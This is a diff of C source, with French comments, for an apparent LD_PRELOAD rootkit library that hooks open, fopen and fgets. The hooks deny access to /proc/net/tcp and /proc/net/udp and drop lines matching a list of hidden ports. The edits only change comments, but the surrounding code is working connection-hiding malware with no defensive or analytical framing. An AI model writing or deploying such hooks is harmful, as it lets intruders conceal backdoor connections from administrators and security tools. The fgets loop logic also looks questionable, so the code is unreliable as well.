@@ -19,7 +19,7 @@ int open(const char *pathname, int flags, ...) {
     if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
 
     if (strstr(pathname, "/proc/net/tcp") || strstr(pathname, "/proc/net/udp")) {
-        errno = ENOENT;  // Correction : Utilisation correcte de errno
+        errno = ENOENT;  
         return -1; // Bloque l'accès
     }
 
@@ -31,7 +31,7 @@ FILE *fopen(const char *pathname, const char *mode) {
     if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");
 
     if (strstr(pathname, "/proc/net/tcp") || strstr(pathname, "/proc/net/udp")) {
-        errno = ENOENT;  // Correction : Utilisation correcte de errno
+        errno = ENOENT;  
         return NULL; // Empêche l'ouverture du fichier
     }
 
@@ -48,7 +48,7 @@ char *fgets(char *str, int size, FILE *stream) {
         if (result == NULL) return NULL;
 
         for (const char **hidden = hidden_ports; *hidden != NULL; hidden++) {
-            if (strstr(str, *hidden)) return orig_fgets(str, size, stream); // Ignore la ligne
+            if (strstr(str, *hidden)) return orig_fgets(str, size, stream); // Ignore la ligne 
         }
 
     } while (0);
